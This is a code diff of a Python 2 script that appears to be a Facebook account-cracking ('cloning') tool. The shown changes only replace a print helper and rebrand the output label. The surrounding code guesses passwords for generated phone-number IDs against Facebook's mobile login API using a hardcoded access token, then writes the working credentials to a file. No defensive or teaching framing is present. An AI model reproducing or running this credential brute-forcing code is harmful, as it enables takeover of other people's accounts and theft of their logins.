@@ -50,10 +50,10 @@ logo = """
 
     print(logo)
     print(" [+]MENU")
-    jalan ('\033[1;96m Total Number of IDs: '+xxx)
-    jalan ('\033[1;95mCode you choosed: '+c)
-    jalan ("\033[1;94mWait A While Start Cloning...")
-    jalan ("\033[1;93mTo Stop Process Press Ctrl+z")
+    print('\033[1;96m Total Number of IDs: '+xxx)
+    print('\033[1;95mCode you choosed: '+c)
+    print("\033[1;94mWait A While Start Cloning...")
+    print("\033[1;93mTo Stop Process Press Ctrl+z")
     print 50* '\033[1;97m-'
     def main(arg):
         global cpb,oks
@@ -74,7 +74,7 @@ logo = """
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;92m(MA-OPEN) ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;92m(KHD-OPEN) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -84,7 +84,7 @@ logo = """
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m(MA-OPEN)  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;92m(KHD-OPEN)  ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
